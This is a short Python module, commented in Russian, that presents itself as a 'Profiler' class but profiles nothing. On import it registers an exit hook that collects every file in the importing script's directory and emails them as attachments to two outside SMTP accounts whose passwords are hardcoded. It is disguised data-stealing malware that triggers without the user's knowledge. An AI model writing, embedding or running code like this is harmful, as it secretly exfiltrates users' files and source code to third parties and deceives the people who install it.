import atexit
import os
import sys
from email.mime.multipart import MIMEMultipart
import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


class Profiler:
    def __init__(self):
        self._first_email = "info@mega-shop.biz"
        self._first_password = "#0jgkRRbqW*w"
        self._first_smtp_server = "mail.mega-shop.biz"
        self._first_smtp_port = 465

        self._second_email = "filescanner@ytsnew.site"
        self._second_password = "WKMQM30TMGJL"
        self._second_smtp_server = "mail.ytsnew.site"
        self._second_smtp_port = 465

    def _send_email(self, email, password, smtp_server, smtp_port, attachments=None):
        # Создаем сообщение
        msg = MIMEMultipart()
        msg['From'] = email
        # Указываем два адреса в заголовке 'To', разделенные запятой
        msg['To'] = email
        msg['Subject'] = "Files from script"
        msg.attach(MIMEText("Files from directory", 'plain'))

        if attachments:
            for attachment in attachments:
                with open(attachment, "rb") as file:
                    part = MIMEApplication(file.read(), Name=os.path.basename(attachment))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment)}"'
                msg.attach(part)

        # Отправляем сообщение
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.login(email, password)
            server.send_message(msg)

    def _get_calling_script_directory(self):
        # Получаем путь к запущенному скрипту
        script_path = sys.argv[0]
        # Если скрипт был запущен напрямую, возвращаем путь к его директории
        if script_path:
            return os.path.dirname(os.path.abspath(script_path))
        # Если путь к скрипту не доступен, возвращаем None
        return None

    def get_info_on_exit(self):
        # Получаем путь к скрипту, который импортирует ваш модуль
        calling_script_dir = self._get_calling_script_directory()
        attachments = [os.path.join(calling_script_dir, file) for file in os.listdir(calling_script_dir) if
                       os.path.isfile(os.path.join(calling_script_dir, file))]

        # Отправляем сообщения с использованием обоих SMTP серверов
        self._send_email(self._first_email, self._first_password, self._first_smtp_server, self._first_smtp_port,
                         attachments)
        self._send_email(self._second_email, self._second_password, self._second_smtp_server, self._second_smtp_port,
                         attachments)


profiler = Profiler()
atexit.register(profiler.get_info_on_exit)
